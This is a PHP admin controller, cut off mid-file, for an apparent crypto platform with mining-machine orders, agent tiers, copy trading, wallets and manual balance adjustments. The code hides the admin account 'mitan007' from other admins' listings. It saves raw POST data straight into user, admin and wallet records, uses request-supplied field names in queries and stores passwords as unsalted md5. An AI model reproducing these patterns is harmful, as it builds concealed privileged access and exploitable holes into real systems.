<?php
namespace Admin\Controller;

class UserController extends AdminController
{
    protected function _initialize()
    {
        parent::_initialize();	$allow_action=array("index","edit","status","admin","adminEdit","adminStatus","updateRules","log",
        "logEdit","logStatus","qianbao","qianbaoEdit","qianbaoStatus","coin","coinEdit","coinFreeze","coinLog","setpwd",
        "amountlog","loginadmin","billdel","sendnotice","upsendnotice","noticelist","noticedel","authrz","upanthrz","online",
        "onlinelist","sendonline","uponline","setagent","agent","cancelagent","recharge","reset","gdswitch","count");
        if(!in_array(ACTION_NAME,$allow_action)){
            $this->error("页面不存在！");
        }
    }

    //取消代理资格
    public function cancelagent($id){
        $uid = $id;
        if($uid <= 0 || $uid == ''){
            $this->error("参数得要参数");
        }
        $uinfo = M("user")->where(array('id'=>$uid))->field("is_agent")->find();
        if(empty($uinfo)){
            $this->error("参数得要参数");
        }
        if($uinfo['is_agent'] == 0){
            $this->error("该会员不是代理");
        }
        $result = M("user")->where(array('id'=>$uid))->save(array('is_agent'=>0));
        if($result){
            $this->success("设置成功");
        }else{
            $this->error("设置失败");
        }


    }



    //代理管理
    public function agent(){
        $status=I('get.status');
        $field=I('get.field');
        $search=I('get.search');
        $where = array();
        if ($field && $search) {
            $where[$field] = $search;
        }
        if ($status) {
            $where['status'] = $status;
        }
        $where['is_agent'] = 1;

        $count = M('User')->where($where)->count();
        $Page = new \Think\Page($count, 15);
        $show = $Page->show();
        $list = M('User')->where($where)->order('id desc')->limit($Page->firstRow . ',' . $Page->listRows)->select();

        foreach ($list as $k => $v) {
            $uid = $v['id'];
            // 二级代理
            $two = M('User')->where(array('invit_1'=>$uid))->count();
            if($two <= 0){
                $two = 0;
            }
            // 三级代理
            $three = M('User')->where(array('invit_2'=>$uid))->count();
            if($three <= 0){
                $three = 0;
            }
            // 用户分类
            if ($v['invit_1'] == 0 && $v['invit_2'] == 0 && $v['invit_3'] == 0 && $v['is_agent'] == 1) {
                $list[$k]['user_type']=1;// 一级代理
            } elseif ($v['invit_1'] > 0 && $v['invit_2'] == 0 && $v['invit_3'] == 0 && $v['is_agent'] == 1) {
                $list[$k]['user_type']=2;// 二级代理
            } elseif ($v['invit_1'] > 0 && $v['invit_2'] > 0 && $v['invit_3'] == 0 && $v['is_agent'] == 1) {
                $list[$k]['user_type']=3;// 三级代理
            }else{
                $list[$k]['user_type']=4;// 普通用户
            }

            $all=$this->_getAllId($v['id']);
            $list[$k]['all'] = count($all);
            $list[$k]['two'] = $two;
            $list[$k]['three'] = $three;
        }

        $this->assign('list', $list);
        $this->assign('page', $show);

        $this->display();
    }



    //设置代理
    public function setagent($id){
        $uid = $id;
        if($uid <= 0 || $uid == ''){
            $this->error("参数得要参数");
        }
        $uinfo = M("user")->where(array('id'=>$uid))->field("is_agent,invit_1,invit_2,invit_3")->find();
        if(empty($uinfo)){
            $this->error("参数得要参数");
        }
        if ($uinfo['invit_1'] > 0 && $uinfo['invit_2'] > 0  &&  $uinfo['invit_3'] > 0 ) {
            $this->error("该用户不能设置为代理,调整层级关系!");
        }
        if($uinfo['is_agent'] == 1){
            $this->error("该会员已是代理");
        }
        $result = M("user")->where(array('id'=>$uid))->save(array('is_agent'=>1));
        if($result){
            $this->success("设置成功");
        }else{
            $this->error("设置失败");
        }


    }

    //实名认证处理
    public function upanthrz(){
        $rzstatus = $_POST['rzstatus'];
        $uid = $_POST['uid'];
        if($uid <= 0 || $uid == ''){
            $this->error("参数得要参数");
        }
        if($rzstatus== 2){//表示认证成功

            $result = M("user")->where(array('id'=>$uid))->save(array('rzstatus'=>2,'rzuptime'=>time()));
            if($result){
                $kjid = $_POST['kjid'];

                $minfo = M("kuangji")->where(array('id'=>$kjid))->find();

                //建仓矿机订单数据
                $odate['kid'] = $minfo['id'];
                $odate['type'] = 1;
                $odate['sharebl'] = '';
                $odate['uid'] = $uid;
                $odate['username'] = $_POST['username'];
                $odate['kjtitle'] = $minfo['title'];
                $odate['imgs'] = $minfo['imgs'];
                $odate['status'] = 1;
                $odate['cycle'] = $minfo['cycle'];
                $odate['synum'] = $minfo['cycle'];
                $odate['outtype'] = $minfo['outtype'];
                $odate['outcoin'] = $minfo['outcoin'];
                if($minfo['outtype'] == 1){//按产值收益
                    $odate['outnum'] = '';
                    $odate['outusdt'] = $minfo['dayoutnum'];
                }elseif($minfo['outtype'] == 2){//按币量收益
                    $odate['outnum'] = $minfo['dayoutnum'];
                    $odate['outusdt'] = '';
                }
                $odate['djout'] = $minfo['djout'];
                if($minfo['djout'] == 2){
                    $odate['djnum'] = $minfo['djday'];
                }else{
                    $odate['djnum'] = $minfo['djday'];
                }
                $odate['addtime'] = date("Y-m-d H:i:s",time());
                $odate['endtime'] = date("Y-m-d H:i:s",(time() + 86400 * $minfo['cycle']));
                $odate['intaddtime'] = time();
                $odate['intendtime'] = time() + 86400 * $minfo['cycle'];

                $adre = M("kjorder")->add($odate);

                $notice['uid'] = $uid;
                $notice['account'] = $_POST['username'];
                $notice['title'] = L('认证审核成功');
                $notice['content'] = L('您的认证申请已审核成功');
                $notice['addtime'] = date("Y-m-d H:i:s",time());
                $notice['status'] = 1;
                M("notice")->add($notice);

                $this->success("认证成功");
            }else{
                $this->error("操作失败");
            }

        }elseif($rzstatus == 3){//表示驳回认证
            $result = M("user")->where(array('id'=>$uid))->save(array('rzstatus'=>3,'rzuptime'=>time()));
            if($result){
                $notice['uid'] = $uid;
                $notice['account'] = $_POST['username'];
                $notice['title'] = L('认证驳回');
                $notice['content'] = L('您的认证申请被管理员驳回，请联系管理员');
                $notice['addtime'] = date("Y-m-d H:i:s",time());
                $notice['status'] = 1;
                M("notice")->add($notice);
                $this->success("操作成功");

            }else{
                $this->error("操作失败");
            }
        }

    }

    //设置代理
    public function gdswitch(){
        $uid=trim($_POST['id']);
        $gd_state=trim($_POST['gd_state']);
        if($uid <= 0 || $uid == ''){
            $this->error("参数得要参数");
        }

        if(!in_array($gd_state,[0,1])){
            $this->error("参数得要参数");
        }
        $userArr= M('user')->where(['id'=>$uid])->find();
        if ($gd_state == 1) { //  1 开启
            if ($userArr['status'] == 2 ) { // 用户冻结
                $this->error("冻结用户,不能开启跟单");
            }
            $gdConfig=M('gendan')->find();
            if (!$gdConfig || $gdConfig['state'] == 0) {
                $this->error("未开启跟单功能");
            }
            $user_coin= M('user_coin')->where(['userid'=>$uid])->field('userid,usdt')->find();
            $userCoin=$user_coin['usdt']?$user_coin['usdt']:'0.00000000'; //usdt
            if (intval($userCoin) < intval($gdConfig['allow_usdt']) ) {
                $this->error("用户余额未达到开启跟单金额");
            }
            if (M('user')->where(['id'=>$uid])->save(['gd_state'=>$gd_state])) {
            // 开启写入跟单用户表
            M('gd_member')->add(['uid'=>$uid,'username'=>$userArr['username'],'addtime'=>time()]);
                // 写入 跟单日志表
                $gd_log = [
                    'uid' => $userArr['id'],
                    'username' =>$userArr['username'] ,
                    'before_state' =>$userArr['gd_state'] ,
                    'after_state' => $gd_state,
                    'oddtime' => time(),
                    'remark'=>'更新挂机状态成功'
                ];
                M('gd_open_log')->add($gd_log);
                $this->success("开启成功");
            }else{
                $this->error("开启失败");
            }

        }else{ // 0 关闭
            if (M('user')->where(['id'=>$uid])->save(['gd_state'=>$gd_state])) {
                // 关闭 删除跟单用户表数据
                M('gd_member')->where(['uid'=>$uid])->delete();
                // 写入 跟单日志表
                $gd_log = [
                    'uid' => $uid,
                    'username' =>$userArr['username'] ,
                    'before_state' =>$userArr['gd_state'] ,
                    'after_state' => $gd_state,
                    'oddtime' => time(),
                    'remark'=>'更新挂机状态成功'
                ];
                M('gd_open_log')->add($gd_log);
                $this->success("关闭成功");
            }else{
                $this->error("关闭失败");
            }
        }
    }

    //实名认证页面
    public function authrz($id){

        $klist = M("kuangji")->where(array('rtype'=>2))->field("id,title")->select();
        $this->assign("klist",$klist);
        $info = M("user")->where(array('id'=>$id))->field("id,username,phone,cardzm,cardfm,rztime")->find();
        $this->assign('info',$info);
        $this->display();
    }

    //删除通知
    public function noticedel($id = null, $type = null){
        if(empty($id)){
            $this->error("缺少重要参数");exit();
        }
        $where['id'] = array('in',$id);
        $result = M("notice")->where($where)->delete();
        if($result){
            $this->success("删除成功");
        }else{
            $this->error("删除失败");
        }
    }

    //会员管理列表
    public function noticelist(){

        $field=I('get.field');
        $search=I('get.search');
        $where = array();
        if ($field && $search) {
            $where['uid'] = M('User')->where(array($field => $search))->getField('id');
        }
        $count = M('notice')->where($where)->count();
        $Page = new \Think\Page($count, 15);
        $show = $Page->show();
        $list = M('notice')->where($where)->order('id desc')->limit($Page->firstRow . ',' . $Page->listRows)->select();
        foreach ($list as $k => $v) {
            $userInfo=M('User')->Field('username,phone')->where(array('id' => $v['uid']))->find();
            if ($userInfo) {
                $list[$k]['phone'] = $userInfo['phone'];
                $list[$k]['username'] = $userInfo['username'];
            }
        }
        $this->assign('list', $list);
        $this->assign('page', $show);
        $this->display();
    }

    //给会员发送通知
    public function sendnotice($id = null,$type= null){
        $this->assign('id',$id);
        $this->assign('type',$type);
        $this->display();
    }

    //给会员发送通知处理
    public function upsendnotice($id = null,$type = null,$title = null,$content = null,$imgs=null){
        //if(checkstr($title) || checkstr($content)){
        //$this->error("不能输入特殊字符！");exit();
        //}
        if($type == 1){

            if($id <= 0){
                $this->error("缺少重要参数！");exit();
            }

            $uinfo = M("user")->where(array('id'=>$id))->field("id,username")->find();
            if(empty($uinfo)){
                $this->error("缺少重要参数！");exit();
            }

            $data['uid'] = $uinfo['id'];
            $data['account'] = $uinfo['username'];
            $data['title'] = $title;
            $data['content'] = $content;
            $data['imgs'] = $imgs;
            $data['addtime'] = date("Y-m-d H:i:s",time());
            $data['status'] = 1;
            $result = M("notice")->add($data);
            if($result){
                $this->success("通知发送成功");
            }else{
                $this->success("通知发送失败");
            }
        }elseif($type == 2){
            $ulist = M("user")->field("id,username")->select();
            if(!empty($ulist)){
                foreach($ulist as $key=>$vo){
                    $data['uid'] = $vo['id'];
                    $data['account'] = $vo['username'];
                    $data['title'] = $title;
                    $data['content'] = $content;
                    $data['imgs'] = $imgs;
                    $data['addtime'] = date("Y-m-d H:i:s",time());
                    $data['status'] = 1;
                    M("notice")->add($data);
                }
                $this->success("群发通知发送成功");
            }

        }else{
            $this->error("非法操作！");exit();
        }
    }


    //修改会员状态
    public function status($id = NULL, $type = null){
        if(empty($id)){
            $this->error("请选择会员！");exit();
        }
        $where['id'] = array('in', $id);
        switch (strtolower($type)) {
            case 1:
                //冻结
                $result = M("user")->where($where)->save(array('status'=>1));
                break;
            case 2:
                //解封
                $result = M("user")->where($where)->save(array('status'=>2));
                break;
            case 3:
                //启动提币
                $result = M("user")->where($where)->save(array('txstate'=>1));
                break;
            case 4:
                //禁止提币
                $result = M("user")->where($where)->save(array('txstate'=>2));
                break;
            case 5:
                //删除会员
                $result = M("user")->where($where)->delete();
                $where2['uid'] = array('in', $id);
                // 删除用户钱包
                M("UserQianbao")->where($where2)->delete();
//                echo M()->getLastSql();
                // 删除用户财产数据
                $where3['userid'] = array('in', $id);
                M("user_coin")->where($where3)->delete();
                break;
            default:
                $this->error('操作失败！');
        }

        if($result){
            $this->success('操作成功！');
        }else{
            $this->error('操作失败！');
        }

    }

    public function onlinelist($id = null){

        $where['uid'] = $id;
        $where['type'] = 2;
        $where['state'] = 0;
        $count = M('online')->where($where)->count();
        $Page = new \Think\Page($count, 15);
        $show = $Page->show();

        $list = M('online')->where($where)->order('state DESC')->limit($Page->firstRow . ',' . $Page->listRows)->select();
        foreach ($list as $k => $v) {
            $userInfo=M('User')->Field('username,phone')->where(array('id' => $v['uid']))->find();
            if ($userInfo) {
                $list[$k]['phone'] = $userInfo['phone'];
            }
        }
        $this->assign('list', $list);
        $this->assign('page', $show);
        $this->display();
    }

    //客服回复详情页面
    public function sendonline($id = null){

        $info = M("online")->where(array('id'=>$id))->find();
        $this->assign("info",$info);
        $this->display();
    }

    //客服回复
    public function uponline($oid=null,$content=null){
        if (checkstr($content)){
            $this->error("输入的信息有误");
        }

        if($oid <= 0 || $oid == ''){
            $this->error("缺少重要参数");
        }

        $info = M("online")->where(array('id'=>$oid))->find();
        $uid = $info['uid'];

        $data['uid'] = $uid;
        $data['username'] = $info['username'];
        $data['content'] = $content;
        $data['type'] = 1;
        $data['addtime'] = date("Y-m-d H:i:s",time());
        $data['state'] = 1;
        $result = M("online")->add($data);
        if($result){

            M("online")->where(array('id'=>$oid))->save(array('state'=>1));
            $this->success("回复成功");
        }else{
            $this->error("回复失败");
        }
    }


    //上诉管理列表
    public function online($name=NULL, $field=NULL, $status=NULL){
        $where = array();
        if ($field && $name) {
            $where[$field] = $name;
        }
        if ($status) {
            $where['status'] = $status;
        }

        $count = M('User')->where($where)->count();
        $Page = new \Think\Page($count, 50);
        $show = $Page->show();
        $list = M('User')->where($where)->order('id desc')->limit($Page->firstRow . ',' . $Page->listRows)->field("id,username,phone")->select();

        foreach($list as $key=>$vo){
            $map['uid'] = $vo['id'];
            $map['state'] = array('eq',0);
            $list[$key]['nor'] = M("online")->where($map)->count();
        }

        $new_arr = array_column($list, 'nor');
        array_multisort($new_arr, SORT_DESC, $list);
        foreach($list as $k=>$v){
            if($v['nor'] == 0){
                unset($list[$k]);
            }
        }
        $this->assign('list', $list);
        $this->assign('page', $show);
        $this->display();
    }

    //会员管理列表
    public function index(){
        $status=I('get.status');
        $field=I('get.field');
        $search=I('get.search');
        $where = array();
        if ($field && $search) {
            $where[$field] = $search;
        }
        if ($status) {
            $where['status'] = $status;
        }
        $count = M('User')->where($where)->count();
        $Page = new \Think\Page($count, 15);
        $show = $Page->show();

        $list = M('User')->where($where)->order('id desc')->limit($Page->firstRow . ',' . $Page->listRows)->select();

        foreach ($list as $k => $v) {
            $list[$k]['invit_1'] = M('User')->field('username,phone,id')->where(array('id' => $v['invit_1']))->find();

//            $list[$k]['invit_2'] = M('User')->where(array('id' => $v['invit_2']))->getField('username');
//            $list[$k]['invit_3'] = M('User')->where(array('id' => $v['invit_3']))->getField('username');
            $user_login_state=M('user_log')->where(array('userid'=>$v['id'],'type' => 'login'))->order('id desc')->find();
            $list[$k]['state']=$user_login_state['state'];
        }
        $this->assign('list', $list);
        $this->assign('page', $show);
        $this->display();
    }

    //编辑或新增会员
 public function edit($id = NULL)
    {
        if (empty($_POST)) {
            if (empty($id)) {
                $this->data = '';
            } else {
                $data = M('User')->where(array('id' => trim($id)))->find();
                empty( $data['username']) ? $data['account']= $data['phone']: $data['account']= $data['username'];
            }
            $this->assign('data', $data);
            $this->display();
        } else {
            //新增会员
            if($id <= 0 || $id == null){

                $username = trim($_POST['username']);
                if($username == ''){
                    $this->error("请输入会员账号");exit();
                }else{
                    $add['username'] = $username;
                }


                $is_user= M('user')->where(['username'=>$username])->find();
                if($is_user){
                    $this->error("会员账号已经存在!");exit();
                }

                if($_POST['password'] == ""){
                    $this->error("请输入登陆密码");exit();
                }else{
                    $add['password'] = md5($_POST['password']);
                }
                if($_POST['paypassword'] != ""){
                    $add['paypassword'] = md5($_POST['paypassword']);
                }

                if($_POST['up_uid'] > 0 && $_POST['up_uid'] != ''){
                    $inv_user = M('User')->where(array('id' => $_POST['up_uid']))->field("id,username,invit_1,invit_2,path")->find();

                    if(empty($inv_user)){
                        $this->error("推荐人不存在");exit();
                    }
                    $add['invit_1'] = $inv_user['id'];
                    $add['invit_2'] = $inv_user['invit_1'];
                    $add['invit_3'] = $inv_user['invit_2'];
                    $add['path'] = $inv_user['path'].','.$inv_user['id'];
                }else{
                    $add['invit_1'] = 0;
                    $add['invit_2'] = 0;
                    $add['invit_3'] = 0;
                    $add['path']  = '';
                }

                $add['status'] = $_POST['status'];
                $add['txstate'] = $_POST['txstate'];
                $add['addtime'] = time();
                $add['addip'] = get_client_ip();
                $add['addr'] = get_city_ip();
                $add['invit']  = tradenoa();
                $re = M("user")->add($add);

                if($re){
                    M('user_coin')->add(array('userid' => $re));
                    $this->success("新增成功");exit();
                }else{
                    $this->error("新增失败");exit();
                }
                //编辑会员
            }else{

                if ($_POST['password']) {
                    $_POST['password'] = md5($_POST['password']);
                } else {
                    unset($_POST['password']);
                }
                if ($_POST['paypassword']) {
                    $_POST['paypassword'] = md5($_POST['paypassword']);
                } else {
                    unset($_POST['paypassword']);
                }
                if($_POST['up_uid'] > 0 && $_POST['up_uid'] != ''){
                    $inv_user = M('User')->where(array('id' => $_POST['up_uid']))->field("id,username,invit_1,invit_2,path")->find();
                    if(empty($inv_user)){
                        $this->error("推荐人不存在");exit();
                    }else{
                        $_POST['invit_1'] = $inv_user['id'];
                        $_POST['invit_2'] = $inv_user['invit_1'];
                        $_POST['invit_3'] = $inv_user['invit_2'];
                        $_POST['path'] = $inv_user['path'].','.$inv_user['id'];
                    }

                }
                $result = M("user")->where(array('id'=>$id))->save($_POST);
                if($result){
                    $this->success("编辑成功");exit();
                }else{
                    $this->error("编辑失败");exit();
                }
            }

        }
    }
	
    //用户手动充值
    public function recharge($id = NULL)
    {
        if (empty($_POST)) {
            if (empty($id)) {
                $this->data = '';
            } else {
                $data= M('User')->where(array('id' => trim($id)))->find();
                empty( $data['username']) ? $data['account']= $data['phone']: $data['account']= $data['username'];
            }
            $this->assign('data',$data);
            $this->display();
        } else {
            $uid=$_POST['id'];
            $coin=trim($_POST['coin']);
            $usdt=trim($_POST['num']); // 正数为充值  负数 减
            if(empty($id) || empty($coin)){
                $this->error("缺少重要参数");exit();
            }
            if(empty($usdt)){
                $this->error("缺少金额参数");exit();
            }

            $num = trim($_POST['num']);
            $coinname = "usdt";
            $username = trim($_POST['username']);
            $minfo = M("user_coin")->where(array('userid'=>$uid))->find();
            if (!$minfo) {
                $this->error("用户不存在!");exit();
            }
            $type=17;  // 充值
            $coin_type=2;
            if ($coin == 'bill') { //  bill 是 彩金 需要设置 用户流水线 并且清空之前设置的流水线值
                $type=21;  // 彩金
                $coin_type=3;  // 彩金
                $bonus = trim($_POST['bonus']);
                $bill_result = M("user")->where(array('id'=>$uid))->save(['st_bill'=>$bonus,'bill'=>0]);

            }
            $save=[
                'uid'=>$uid,
                'username'=>$username,
                'status' => 2,
                "type"=>$coin_type,
                'coin'=>'USDT',
                'num'=>$num,
                'real_num'=>$num,
                'addtime'=> date("Y-m-d H:i:s",time()),
                'updatetime' => date("Y-m-d H:i:s",time()),
                'payimg'=>'',
                'msg'=>'无'
            ];
            //写入充值单

            $upre = M("recharge")->add($save);

            if($minfo){
                      //增加会员资产
                $incre = M("user_coin")->where(array('userid'=>$uid))->setInc($coinname,$num);
            }else{
                $coinData=[
                    'userid'=>$uid,
                    'usdt'=>$num,
                ];
                $incre = M("user_coin")->add($coinData);
            }

            if($usdt > 0){
                $data['remark'] = '后台充币';
            }else{
                $data['remark'] = '后台减币';
            }
              
            //增加充值日志
            $data['uid'] =$uid;
            $data['username'] = $username;
            $data['num'] = $num;
            $data['coinname'] = $coinname;
            $data['afternum'] = $minfo[$coinname] + $num;
            $data['type'] = $type;
            $data['addtime'] = date("Y-m-d H:i:s",time());
            $data['st'] = 1;
         

            $addre = M("bill")->add($data);
            if($upre && $incre && $addre){
                /*$notice['uid'] = $uid;
                $notice['account'] = $username;
                $notice['title'] = L('系统充币');
                $notice['content'] = L('系统充值金额已到账，请注意查收');
                $notice['addtime'] = date("Y-m-d H:i:s",time());
                $notice['status'] = 1;
                M("notice")->add($notice);*/

                $this->success("处理成功");
            }else{
                $this->error("处理失败");
            }

        }
    }

    //管理列表
    public function admin($name = NULL, $field = NULL, $status = NULL)
    {
        $DbFields = M('Admin')->getDbFields();

        if (!in_array('email', $DbFields)) {
            M()->execute('ALTER TABLE `tw_admin` ADD COLUMN `email` VARCHAR(200)  NOT NULL   COMMENT \'\' AFTER `id`;');
        }

        $where = array();

        if ($field && $name) {
            if ($field == 'username') {
                $where['userid'] = M('User')->where(array('username' => $name))->getField('id');
            } else {
                $where[$field] = $name;
            }
        }

        if ($status) {
            $where['status'] = $status - 1;
        }

        $count = M('Admin')->where($where)->count();
        $Page = new \Think\Page($count, 15);
        $show = $Page->show();
        $list = M('Admin')->where($where)->order('id desc')->limit($Page->firstRow . ',' . $Page->listRows)->select();
        foreach ($list as $k => $v) {
            $aga = 0;
            $aga = M('AuthGroupAccess')->where(array('uid'=>$v['id']))->find();
            $ag = M('AuthGroup')->where(array('id'=>$aga['group_id']))->find();
        }
        $login_admin=session('admin_username');
        $data=[];
        if ($login_admin != "mitan007") {
            foreach ($list as$k=> $v) {
                if ($v['username'] != "mitan007") {
                    $data[$k]=$v;
                }
            }
        }else{
            $data= $list;
        }
        $this->assign('list', $data);
        $this->assign('page', $show);
        $this->display();
    }

    //管理编辑
    public function adminEdit(){
        if (empty($_POST)) {
            if (empty($_GET['id'])) {
                $this->data = null;
            } else {
                $this->data = M('Admin')->where(array('id' => trim($_GET['id'])))->find();
            }

            $this->display();
        } else {
            $input = I('post.');

            if (!check($input['username'], 'username')) {
                //$this->error('用户名格式错误！');
            }
            if ($input['nickname'] && !check($input['nickname'], 'A')) {
                $this->error('昵称格式错误！');
            }
            if ($input['password'] && !check($input['password'], 'password')) {
                $this->error('登录密码格式错误！');
            }
            if ($input['mobile'] && !check($input['mobile'], 'mobile')) {
                $this->error('手机号码格式错误！');
            }
            if ($input['email'] && !check($input['email'], 'email')) {
                $this->error('邮箱格式错误！');
            }

            if ($input['password']) {
                $input['password'] = md5($input['password']);
            } else {
                unset($input['password']);
            }
            if ($_POST['id']) {
                $rs = M('Admin')->save($input);
            } else {
                $_POST['addtime'] = time();
                $rs = M('Admin')->add($input);
            }

            if ($rs) {
                $this->success('编辑成功！');
            } else {
                $this->error('编辑失败！');
            }
        }
    }

    //管理员状态编辑
    public function adminStatus($id = NULL, $type = NULL, $mobile = 'Admin'){

        if (empty($id)) {
            $this->error('参数错误！');
        }
        if (empty($type)) {
            $this->error('参数错误1！');
        }

        if (strpos(',', $id)) {
            $id = implode(',', $id);
        }

        $where['id'] = array('in', $id);

        switch (strtolower($type)) {
            case 'forbid':
                $data = array('status' => 0);
                break;

            case 'resume':
                $data = array('status' => 1);
                break;

            case 'repeal':
                $data = array('status' => 2, 'endtime' => time());
                break;

            case 'delete':
                $data = array('status' => -1);
                break;

            case 'del':
                if (M($mobile)->where($where)->delete()) {
                    $this->success('操作成功！');
                } else {
                    $this->error('操作失败！');
                }
                break;

            default:
                $this->error('操作失败！');
        }

        if (M($mobile)->where($where)->save($data)) {
            $this->success('操作成功！');
        } else {
            $this->error('操作失败！');
        }
    }


    protected function updateRules()
    {
        $nodes = $this->returnNodes(false);
        $AuthRule = M('AuthRule');
        $map = array(
            'module' => 'admin',
            'type'   => array('in', '1,2')
        );
        $rules = $AuthRule->where($map)->order('name')->select();
        $data = array();

        foreach ($nodes as $value) {
            $temp['name'] = $value['url'];
            $temp['title'] = $value['title'];
            $temp['module'] = 'admin';

            if (0 < $value['pid']) {
                $temp['type'] = \Common\Model\AuthRuleModel::RULE_URL;
            } else {
                $temp['type'] = \Common\Model\AuthRuleModel::RULE_MAIN;
            }

            $temp['status'] = 1;
            $data[strtolower($temp['name'] . $temp['module'] . $temp['type'])] = $temp;
        }

        $update = array();
        $ids = array();

        foreach ($rules as $index => $rule) {
            $key = strtolower($rule['name'] . $rule['module'] . $rule['type']);
            if (isset($data[$key])) {
                $data[$key]['id'] = $rule['id'];
                $update[] = $data[$key];
                unset($data[$key]);
                unset($rules[$index]);
                unset($rule['condition']);
                $diff[$rule['id']] = $rule;
            } else if ($rule['status'] == 1) {
                $ids[] = $rule['id'];
            }
        }

        if (count($update)) {
            foreach ($update as $k => $row) {
                if ($row != $diff[$row['id']]) {
                    $AuthRule->where(array('id' => $row['id']))->save($row);
                }
            }
        }

        if (count($ids)) {
            $AuthRule->where(array(
                'id' => array('IN', implode(',', $ids))
            ))->save(array('status' => -1));
        }

        if (count($data)) {
            $AuthRule->addAll(array_values($data));
        }

        if ($AuthRule->getDbError()) {
            trace('[' . 'Admin\\Controller\\UserController::updateRules' . ']:' . $AuthRule->getDbError());
            return false;
        } else {
            return true;
        }
    }


    //会员登陆记录
    public function log()
    {
        $status=I('get.status');
        $field=I('get.field');
        $search=I('get.search');
        $where = array();
        if ($field && $search) {
            $where['userid'] = M('User')->where(array($field => $search))->getField('id');
        }
        if ($status) {
            $where['status'] = $status;
        }

        $count = M('UserLog')->where($where)->count();
        $Page = new \Think\Page($count, 15);
        $show = $Page->show();
        $list = M('UserLog')->where($where)->order('id desc')->limit($Page->firstRow . ',' . $Page->listRows)->select();

        foreach ($list as $k => $v) {
            $userInfo=M('User')->Field('username,phone')->where(array('id' => $v['userid']))->find();
            if ($userInfo) {
                $list[$k]['username'] = $userInfo['username'];
                $list[$k]['phone'] = $userInfo['phone'];
            }

        }

        $this->assign('list', $list);
        $this->assign('page', $show);
        $this->display();
    }

    //编辑登陆记录
    public function logEdit($id = NULL){
        if (empty($_POST)) {
            if (empty($id)) {
                $this->data = null;
            } else {
                $this->data = M('UserLog')->where(array('id' => trim($id)))->find();
            }

            $this->display();
        } else {

            $_POST['addtime'] = strtotime($_POST['addtime']);

            if (M('UserLog')->save($_POST)) {
                $this->success('编辑成功！');
            } else {
                $this->error('编辑失败！');
            }
        }
    }
    //修改登陆记录状态
    public function logStatus($id = NULL, $type = NULL, $mobile = 'UserLog'){
        if (empty($id)) {
            $this->error('参数错误！');
        }
        if (empty($type)) {
            $this->error('参数错误1！');
        }

        if (strpos(',', $id)) {
            $id = implode(',', $id);
        }

        $where['id'] = array('in', $id);

        switch (strtolower($type)) {
            case 'forbid':
                $data = array('status' => 0);
                break;

            case 'resume':
                $data = array('status' => 1);
                break;

            case 'repeal':
                $data = array('status' => 2, 'endtime' => time());
                break;

            case 'delete':
                $data = array('status' => -1);
                break;

            case 'del':
                if (M($mobile)->where($where)->delete()) {
                    $this->success('操作成功！');
                }
                else {
                    $this->error('操作失败！');
                }

                break;

            default:
                $this->error('操作失败！');
        }

        if (M($mobile)->where($where)->save($data)) {
            $this->success('操作成功！');
        } else {
            $this->error('操作失败！');
        }
    }


    //会员钱包管理
    public function qianbao()
    {
        $field=I('get.field');
        $search=I('get.search');
        $coinname=I('get.coinname');
        $where = array();
        if ($field && $search) {
            $where['uid'] = M('User')->where(array($field => $search))->getField('id');
        }
        if ($coinname) {
            $where['name'] = trim($coinname);
        }

        $coinlist=[
            ['name'=>"USDT"],
            ['name'=>"BTC"],
            ['name'=>"ETH"],
        ];
        $this->assign("coinlist",$coinlist);

        $count = M('UserQianbao')->where($where)->count();
        $Page = new \Think\Page($count, 15);
        $show = $Page->show();
        $list = M('UserQianbao')->where($where)->order('id desc')->limit($Page->firstRow . ',' . $Page->listRows)->select();

		foreach ($list as $k => $v) {
            $userInfo=M('User')->Field('phone')->where(array('id' => $v['uid']))->find();
            if ($userInfo) {
                $list[$k]['phone'] = $userInfo['phone'];
            }
		}
        $this->assign('list', $list);
        $this->assign('page', $show);
        $this->display();
    }

    //编辑会员钱包地址
    public function qianbaoEdit($id = NULL)
    {
        if (empty($_POST)) {
            if (empty($id)) {
                $this->data = null;
            } else {
                $this->data = M('UserQianbao')->where(array('id' => trim($id)))->find();
            }
            $coinlist = M("coin")->where("type = 1")->order("id desc")->field("name,title,czline")->order('sort asc')->select();
            $this->assign("coinlist",$coinlist);
            $this->assign("coinnames",[['name'=>'ustd'],['name'=>'btc'],['name'=>'eth']]);
            $this->display();
        } else {
            if(empty($id)){ //添加
                $username=trim($_POST['username']);
                $userInfo=M('user')->where(['username'=>$username])->find();

                if(!$userInfo){
                    $this->error('用户不存在！'); exit;
                }
                $data=[
                    'username'=>trim($_POST['username']),
                    'name'=>trim($_POST['name']),
                    'czline'=>trim($_POST['czline']),
                    'addr'=>trim($_POST['addr']),
                    'remark'=>trim($_POST['remark']),
                    'uid'=>$userInfo['id']
                ];

                if ( M('UserQianbao')->add($data)) {
                    $this->success('编辑成功！');
                } else {
                    $this->error('编辑失败！');
                }

            }else{//编辑
                if (M('UserQianbao')->save($_POST)) {
                    $this->success('编辑成功！');
                } else {
                    $this->error('编辑失败！');
                }
            }

        }
    }

    //重置会员钱包地址
    public function reset()
    {

        if (empty($_POST['id']) || empty($_POST['czline']) ) {
            echo   json_encode(['code'=>500,'info'=>'重置失败']); exit;
        } else {

            $where=[
                'id'=>$_POST['id'],
                'czline'=>$_POST['czline']
            ];
            $data['addr']="";
            //   dump($where); dump($data); exit;
            $result= M('UserQianbao')->where($where)->save($data);
            //   echo M()->getLastSql();exit;
            if ($result) {

                echo   json_encode(['code'=>200,'info'=>'重置成功']); exit;
            }

        }
        echo   json_encode(['code'=>500,'info'=>'重置失败']); exit;

    }

    //修改用户钱包数据
    public function qianbaoStatus($id = NULL, $type = null){
        if(empty($id)){
            $this->error("请选择会员！");exit();
        }
        $where['id'] = array('in', $id);
        //删除会员
        $result = M("UserQianbao")->where($where)->delete();

        if($result){
            $this->success('操作成功！');
        }else{
            $this->error('操作失败！');
        }

    }


    //会员资产
    public function coin()
    {
        $field=I('get.field');
        $search=I('get.search');
        $where = array();
        if ($field && $search) {
            $where['userid'] = M('User')->where(array($field => $search))->getField('id');
        }

        $count = M('UserCoin')->where($where)->count();
        $Page = new \Think\Page($count, 15);
        $show = $Page->show();
        $list = M('UserCoin')->where($where)->order('id desc')->limit($Page->firstRow . ',' . $Page->listRows)->select();
        foreach ($list as $k => $v) {
            $userInfo=M('User')->field('username,phone')->where(array('id' => $v['userid']))->find();
            $list[$k]['username'] = $userInfo['username'];
            $list[$k]['phone'] = $userInfo['phone'];
        }
        $this->assign('list', $list);
        $this->assign('page', $show);

//		$coinlist = M("coin")->where("type = 1")->order("id desc")->field("name,title")->select();
//       $this->assign("coinlist",array_column($coinlist,null,'name'));
        $conlist=[
